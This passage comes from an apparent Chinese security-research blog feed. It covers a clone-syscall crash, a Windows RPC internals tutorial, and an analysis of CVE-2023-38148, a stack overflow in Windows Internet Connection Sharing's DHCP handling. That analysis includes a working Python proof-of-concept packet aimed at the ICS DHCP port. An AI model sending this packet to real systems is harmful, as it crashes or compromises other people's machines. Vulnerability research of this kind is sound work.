CLONE_SIGHAND | CLONE_THREAD),</span></span><br><span class="line">    <span class="comment">//       &quot;r&quot; (stack_end), &quot;r&quot;((long)0)</span></span><br><span class="line">    <span class="comment">//     : &quot;rax&quot;, &quot;rdi&quot;, &quot;rsi&quot;, &quot;rdx&quot;, &quot;r10&quot;, &quot;r8&quot;</span></span><br><span class="line">    <span class="comment">// );</span></span><br><span class="line">    pid = (<span class="type">int</span>)this_syscall((CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD),</span><br><span class="line">        (<span class="type">long</span>)stack_end,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">56</span> <span class="comment">// clone</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child thread\n&quot;</span>);</span><br><span class="line">        __asm__ __volatile__(</span><br><span class="line">            <span class="string">&quot;movq -0x108(%%rsp), %0\n\t&quot;</span></span><br><span class="line">            <span class="string">&quot;movq -0x100(%%rsp), %1\n\t&quot;</span></span><br><span class="line">            :<span class="string">&quot;=r&quot;</span>(arg),<span class="string">&quot;=r&quot;</span>(thread_func)</span><br><span class="line">        );</span><br><span class="line">        thread_func(arg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (</span></span><br><span class="line">    <span class="comment">//     &quot;movq $60, %%rax;\n\t&quot; // syscall for exit</span></span><br><span class="line">    <span class="comment">//     &quot;movq $0, %%rdi;\n\t&quot;</span></span><br><span class="line">    <span class="comment">//     &quot;syscall;&quot;::</span></span><br><span class="line">    <span class="comment">// );</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fnc</span><span class="params">(<span class="type">void</span> *new)</span>&#123;</span><br><span class="line">    x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">void</span> *a = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">2</span>);</span><br><span class="line">    this_pthread_create(&amp;pid, fnc, <span class="number">0</span>, a+<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">this_syscall:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    mov r10, rcx</span><br><span class="line">    mov rax, qword ptr[rbp+0x10]</span><br><span class="line">    syscall</span><br><span class="line">    pop rbp</span><br><span class="line">    ret</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码一运行, 就会出现崩溃, 且<code>rip</code>等于0, 用上gdb调试, 也摸不着头脑, 最后终于知道问题在哪, 问题就在<code>this_syscall</code>的实现上.</p><p>clone这个syscall调用, 成功时, 会返回两种值, 一种是线程pid, 此时就运行在调用方的线程里. 一种是0, 此时在新建的线程里.  当从新线程返回时, <code>rsp</code>会被更新为新线程的<code>rsp</code>(即函数里的stack_end参数).</p><p>在<code>this_syscall</code>的第七行调用了<code>pop rbp</code>和<code>ret</code>, 如果当前线程是新线程, rsp已经被更新了, pop和ret操作都是在新的栈里操作的, 导致ret获取了0作为rip, 从而造成了崩溃.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于技术的一些奇奇怪怪的知识点&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows Internet Connection Sharing (ICS) cve-2023-38148 分析</title>
    <link href="http://474172261.github.io/2023/09/13/ics_CVE-2023-38148-readme/"/>
    <id>http://474172261.github.io/2023/09/13/ics_CVE-2023-38148-readme/</id>
    <published>2023-09-13T10:32:19.055Z</published>
    <updated>2023-09-28T01:41:28.155Z</updated>
    
    <content type="html"><![CDATA[<p>简要分析bug成因, 仅供研究学习.</p><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先, 创建一个windows虚拟机, 添加两个网卡, 记作net1, net2. 依照 <a href="https://support.ringcentral.com/article-v2/Enable-Internet-Connection-Sharing-ICS.html?brand=RC_US&product=RingCentral_MVP&language=en_US">Enable Internet Connection Sharing (ICS) in Windows 10</a>启用网络共享.</p><p>正常启用后, 观察监听端口, 可以看到多了3个新的监听端口, 分别是53, 67, 68, 都来自同一个进程, 如下所示:</p><p><img src="/images/ics_CVE-2023-38148-readme.assets/1694601348253.png" alt="1694601348253"></p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对比文件<code>ipnathlp.dll</code>文件如下:</p><p><img src="/images/ics_CVE-2023-38148-readme.assets/1694601552120.png" alt="1694601552120"></p><p>可以看到, 在左侧行37位置, 当长度超过0x20时, 它并没有跳转到结束, 而是继续处理, 补丁后, 它直接结束了后续函数操作. 所以问题很明显, 就是在后续的操作中可能存在溢出问题.</p><p>这里<code>a2+228</code>为data开始位置, buffer空间大小为1500. <code>a2+220</code>指示buffer中数据长度.</p><p>跟踪了<code>DhcpExtractOptionsFromMessage</code>并没有发现问题, 跟踪<code>DhcpProcessBootpMessage-&gt;DhcpAddArpEntry</code>, 有如下代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DhcpRemoveArpEntry(a1);</span><br><span class="line">memset_0(&amp;Row, 0, sizeof(Row));</span><br><span class="line">Row.InterfaceIndex = DhcpAdapterIndex;</span><br><span class="line">Row.Address.Ipv4.sin_family = 2;</span><br><span class="line">Row.Address.Ipv4.sin_addr.S_un.S_addr = a1;</span><br><span class="line">Row.PhysicalAddressLength = v4;</span><br><span class="line">memcpy_0(Row.PhysicalAddress, Src, v4);</span><br><span class="line">v10 = CreateIpNetEntry2(&amp;Row);</span><br></pre></td></tr></table></figure><p><code>v4</code>为<code>a2+230</code>的值, 即DHCP协议的Hardware address length 字段, <code>Row</code>是栈结构体, 大小为0xa8, 可以看到此处当<code>v4</code>超过<code>0xa8</code>时, 就会栈溢出.</p><blockquote><p>除此以外, <code>V2DhcpProcessMessage</code>也存在相同情况.</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">s = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">addr = (<span class="string">&#x27;192.168.137.1&#x27;</span>, <span class="number">67</span>)</span><br><span class="line">data = <span class="string">b&quot;\x01\x01\xcc\x00\x94\x27\x17\x55\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x29\xab&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\xf4\x97\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x63\x82\x53\x63&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x35\x00\x32\x04\xc0\xa8\x96\x80\x37\x12\x01\x1c\x02\x79\x0f&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x06\x0c\x28\x29\x2a\x1a\x77\x03\x79\xf9\x21\xfc\x2a\xff\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> \</span><br><span class="line"><span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">s.sendto(data, addr)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;简要分析bug成因, 仅供研究学习.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows RPC 介绍</title>
    <link href="http://474172261.github.io/2023/09/06/rpc_readme/"/>
    <id>http://474172261.github.io/2023/09/06/rpc_readme/</id>
    <published>2023-09-06T10:11:27.861Z</published>
    <updated>2024-07-30T07:35:56.366Z</updated>
    
    <content type="html"><![CDATA[<p>windows的rpc是一个很重要的接口, 以前我对它一直不算了解, 今天以一个安全研究的角度去介绍一下它. </p><span id="more"></span><h2 id="注册rpc服务"><a href="#注册rpc服务" class="headerlink" title="注册rpc服务"></a>注册rpc服务</h2><p>server 通过 RpcServerUseProtseqEp 注册服务, 可以有的类型有: ncalrpc (ALPC), ncacn_np (named pipe) or ncacn_ip_tcp (TCP socket) <a href="https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html" title="ow to secure a Windows RPC Server, and how not to.">参考链接</a><br>pipe类型:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RpcServerUseProtseqEp(</span><br><span class="line">    L&quot;ncacn_np&quot;,</span><br><span class="line">    RPC_C_PROTSEQ_MAX_REQS_DEFAULT,</span><br><span class="line">    L&quot;\\pipe\\DEMO&quot;,</span><br><span class="line">    nullptr);</span><br></pre></td></tr></table></figure><p>socket类型:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">status = RpcServerUseProtseqEp(</span><br><span class="line">   reinterpret_cast&lt;unsigned char*&gt;(&quot;ncacn_ip_tcp&quot;), // Use TCP/IP protocol.</span><br><span class="line">   RPC_C_PROTSEQ_MAX_REQS_DEFAULT, // Backlog queue length for TCP/IP.</span><br><span class="line">   reinterpret_cast&lt;unsigned char*&gt;(&quot;4747&quot;),         // TCP/IP port to use.</span><br><span class="line">   NULL);                          // No security.</span><br></pre></td></tr></table></figure><p>alpc类型:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RpcServerUseProtseqEpA(&quot;ncalrpc&quot;, 10, &quot;spoolss&quot;, SecurityDescriptor);</span><br></pre></td></tr></table></figure><p>之后是注册rpc函数接口:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif">RpcServerRegisterIf</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif2">RpcServerRegisterIf2</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterifex">RpcServerRegisterIfEx</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif3">RpcServerRegisterIf3</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverinterfacegroupcreatew">RpcServerInterfaceGroupCreate</a></li></ul><p>以后面示例代码<code>Example1Server.cpp</code>为例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">status = RpcServerRegisterIf2(</span><br><span class="line">   Example1_v1_0_s_ifspec, <span class="comment">// Interface to register.</span></span><br><span class="line">   <span class="literal">NULL</span>, <span class="comment">// Use the MIDL generated entry-point vector.</span></span><br><span class="line">   <span class="literal">NULL</span>, <span class="comment">// Use the MIDL generated entry-point vector.</span></span><br><span class="line">   RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, <span class="comment">// Forces use of security callback.</span></span><br><span class="line">   RPC_C_LISTEN_MAX_CALLS_DEFAULT, <span class="comment">// Use default number of concurrent calls.</span></span><br><span class="line">   (<span class="type">unsigned</span>)<span class="number">-1</span>, <span class="comment">// Infinite max size of incoming data blocks.</span></span><br><span class="line">   SecurityCallback); <span class="comment">// Naive security callback.</span></span><br></pre></td></tr></table></figure><p>第四个参数flag, 值如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#define RPC_IF_AUTOLISTEN                   0x0001</span><br><span class="line">#define RPC_IF_OLE                          0x0002</span><br><span class="line">#define RPC_IF_ALLOW_UNKNOWN_AUTHORITY      0x0004</span><br><span class="line">#define RPC_IF_ALLOW_SECURE_ONLY            0x0008</span><br><span class="line">#define RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH 0x0010</span><br><span class="line">#define RPC_IF_ALLOW_LOCAL_ONLY             0x0020</span><br><span class="line">#define RPC_IF_SEC_NO_CACHE                 0x0040</span><br><span class="line">#if (NTDDI_VERSION &gt;= NTDDI_VISTA)</span><br><span class="line">#define RPC_IF_SEC_CACHE_PER_PROC           0x0080</span><br><span class="line">#define RPC_IF_ASYNC_CALLBACK               0x0100</span><br></pre></td></tr></table></figure><p>有<code>RPC_IF_ALLOW_SECURE_ONLY</code>代表接口需要认证.</p><p>在<a href="https://www.codeproject.com/Articles/4837/Introduction-to-RPC-Part-1#Implicitandexplicithandles17" title="Introduce RPC">示例项目</a>里, 它会自动生成<code>Example1_s.c</code>文件, 里面有<code>Example1_v1_0_s_ifspec</code>的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">RPC_IF_HANDLE Example1_v1_0_s_ifspec = (RPC_IF_HANDLE)&amp; Example1___RpcServerInterface;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> RPC_SERVER_INTERFACE Example1___RpcServerInterface =</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">sizeof</span>(RPC_SERVER_INTERFACE),</span><br><span class="line">    &#123;&#123;<span class="number">0x00000001</span>,<span class="number">0xEAF3</span>,<span class="number">0x4A7A</span>,&#123;<span class="number">0xA0</span>,<span class="number">0xF2</span>,<span class="number">0xBC</span>,<span class="number">0xE4</span>,<span class="number">0xC3</span>,<span class="number">0x0D</span>,<span class="number">0xA7</span>,<span class="number">0x7E</span>&#125;&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    &#123;&#123;<span class="number">0x8A885D04</span>,<span class="number">0x1CEB</span>,<span class="number">0x11C9</span>,&#123;<span class="number">0x9F</span>,<span class="number">0xE8</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x2B</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0x60</span>&#125;&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    (RPC_DISPATCH_TABLE*)&amp;Example1_v1_0_DispatchTable,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &amp;Example1_ServerInfo,</span><br><span class="line">    <span class="number">0x06000000</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> RPC_DISPATCH_FUNCTION Example1_table[] =</span><br><span class="line">    &#123;</span><br><span class="line">    NdrServerCall2,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> RPC_DISPATCH_TABLE Example1_v1_0_DispatchTable = </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">1</span>,<span class="comment">// 指定了有几个回调函数.</span></span><br><span class="line">    (RPC_DISPATCH_FUNCTION*)Example1_table</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> SERVER_ROUTINE Example1_ServerRoutineTable[] = </span><br><span class="line">    &#123;</span><br><span class="line">    (SERVER_ROUTINE)Output<span class="comment">// 导出函数</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MIDL_SERVER_INFO Example1_ServerInfo = </span><br><span class="line">    &#123;</span><br><span class="line">    &amp;Example1_StubDesc,</span><br><span class="line">    Example1_ServerRoutineTable,<span class="comment">// 导出函数表</span></span><br><span class="line">    Example1__MIDL_ProcFormatString.Format,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">short</span> *) Example1_FormatStringOffsetTable,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (RPC_SYNTAX_IDENTIFIER*)&amp;_NDR64_RpcTransferSyntax_1_0,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    (MIDL_SYNTAX_INFO*)Example1_SyntaxInfo</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>在IDA中看<code>Example1___RpcServerInterface</code>:</p><p><img src="/images/rpc_readme/1694054196198.png" alt="1694054196198"></p><p><strong>其中+4位置是rpc服务对应的UUID.</strong></p><p>再看<code>[50h]</code>位置的<code>Example1_ServerInfo</code>:</p><p><img src="/images/rpc_readme/1694054233133.png" alt="1694054233133"></p><p>再看<code>[8h]</code>位置的<code>SERVER_ROUTINE</code>表:</p><p><img src="/images/rpc_readme/1694054247738.png" alt="1694054247738"></p><h2 id="client调用"><a href="#client调用" class="headerlink" title="client调用"></a>client调用</h2><p>client要调用服务, 必须通过<code>RpcStringBindingCompose</code>函数绑定, 再通过<code>RpcBindingFromStringBinding</code>获得<code>RPC_BINDING_HANDLE</code>, 下面是示例代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">status = RpcStringBindingCompose(</span><br><span class="line">   NULL, // UUID to bind to.</span><br><span class="line">   reinterpret_cast&lt;unsigned char*&gt;(&quot;ncacn_ip_tcp&quot;), // Use TCP/IP</span><br><span class="line">                                                     // protocol.</span><br><span class="line">   reinterpret_cast&lt;unsigned char*&gt;(&quot;localhost&quot;), // TCP/IP network</span><br><span class="line">                                                  // address to use.</span><br><span class="line">   reinterpret_cast&lt;unsigned char*&gt;(&quot;4747&quot;), // TCP/IP port to use.</span><br><span class="line">   NULL, // Protocol dependent network options to use.</span><br><span class="line">   &amp;szStringBinding); // String binding output.</span><br><span class="line"></span><br><span class="line">status = RpcBindingFromStringBinding(</span><br><span class="line">   szStringBinding, // The string binding to validate.</span><br><span class="line">   &amp;hExample1Binding); // Put the result in the implicit binding</span><br><span class="line">                       // handle defined in the IDL file.</span><br></pre></td></tr></table></figure><p>bind后, 直接调用接口代码即可<code>Output(&quot;Hello Implicit RPC World!&quot;);</code>, 实际上, 它真实的调用是如下:</p><p><img src="/images/rpc_readme/1694054894682.png" alt="1694054894682"></p><p>通过调用<code>NdrClientCall3</code>函数来实现调用. 第二个参数就是目标server的函数编号, 此处就是第<code>0</code>号函数(即<code>Example1_ServerRoutineTable[0]</code>), 从第四个参数开始, 就是目标函数所需要的参数.</p><p>观察一下它的 <code>Example1_ProxyInfo</code></p><p><img src="/images/rpc_readme/1694055232546.png" alt="1694055232546"></p><p><code>Example1_StubDesc</code>:</p><p><img src="/images/rpc_readme/1694055253629.png" alt="1694055253629"></p><p>从这个结构体可以看到, +18h位置是<code>&amp;hExample1Binding</code>, 指向<code>RPC_BINDING_HANDLE</code>.</p><p>再看<code>Example1___RpcClientInterface</code>对象(<code>_RPC_CLIENT_INTERFACE</code>结构体), +4位置是server对应的uuid</p><p><img src="/images/rpc_readme/1694083472060.png" alt="1694083472060"></p><p>下面从调试角度看看它的关系:</p><p><img src="/images/rpc_readme/1694056212795.png" alt="1694056212795"></p><p>继续handle对应的结构体:</p><p><img src="/images/rpc_readme/1694056354014.png" alt="1694056354014"></p><p>如图, 在<code>[F0h]</code>偏移位置的地址, 指向的结构体存在三个指针, 这三个指针分别是<code>RpcStringBindingCompose</code>的参数.</p><h2 id="在NdrClientCall3找rpc接口"><a href="#在NdrClientCall3找rpc接口" class="headerlink" title="在NdrClientCall3找rpc接口"></a>在<code>NdrClientCall3</code>找rpc接口</h2><p>一个方法就是通过上述<code>poi(poi(poi(poi(@rcx)+18))+f0)</code>偏移去找字符串</p><p>某些情况下, 可能<code>RPC_BINDING_HANDLE</code>指针不存在(即poi(poi(@rcx)+18)为空), 这种情况下, 一般第四个参数(即函数调用的第一个参数), 是一个和binding_handle 有关的结构体. 在同一个dll里, 通过查找它的引用, 大概率找得到声明位置. </p><p>以下以sspi接口中<code>sspicli.dll!SspipProcessSecurityContext</code>调用的rpc来示例如何寻找:</p><p><strong>方法1: 通过逆向代码查找</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  LODWORD(v19.Pointer) = IsOkayToExec(&amp;v58);</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v19.Simple) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v79 = v58[<span class="number">3</span>];</span><br><span class="line">     ......</span><br><span class="line">v19.Pointer = NdrClientCall3((MIDL_STUBLESS_PROXY_INFO *)&amp;sspirpc_ProxyInfo, <span class="number">6u</span>, <span class="number">0</span>i64, v79, &amp;v90, v61, v59).Pointer;<span class="comment">// 1. 关注第四个参数, 来自行1的v58</span></span><br><span class="line">      </span><br><span class="line">NTSTATUS __fastcall <span class="title function_">IsOkayToExec</span><span class="params">(_QWORD *a1)</span><span class="comment">// 2. 深入函数实现</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (DllState &amp; <span class="number">0x40000000</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !SecDllClient )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1073741502</span>;</span><br><span class="line">      *a1 = SecDllClient;<span class="comment">// 3. 找到赋值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>通过查找<code>SecDllClient</code>的引用, 来到函数<code>InitState</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">InitState</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    RpcConnection = CreateRpcConnection(<span class="number">0</span>, <span class="number">2</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v4, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;SecLsaPackageCount, (__int64)&amp;v3);</span><br><span class="line">    ......</span><br><span class="line">  SecDllClient = LocalAlloc(<span class="number">0x40</span>u, <span class="number">0x30</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( SecDllClient )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_QWORD *)SecDllClient + <span class="number">3</span>) = v4;<span class="comment">// 4. +8位置赋值了v4      </span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">CreateRpcConnection</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3, __int64 a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  result = SecpGetRpcBinding(&amp;Binding);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14.Simple = <span class="number">0</span>i64;</span><br><span class="line">    v12 = a2;</span><br><span class="line">    v10.Pointer = NdrClientCall3((MIDL_STUBLESS_PROXY_INFO *)&amp;sspirpc_ProxyInfo, <span class="number">0</span>, <span class="number">0</span>i64, Binding, a1, v12, a5, a4, a3).Pointer;<span class="comment">// 5. v4即a3, a3来自于rpc调用的赋值. 关注到第四个参数binding</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title 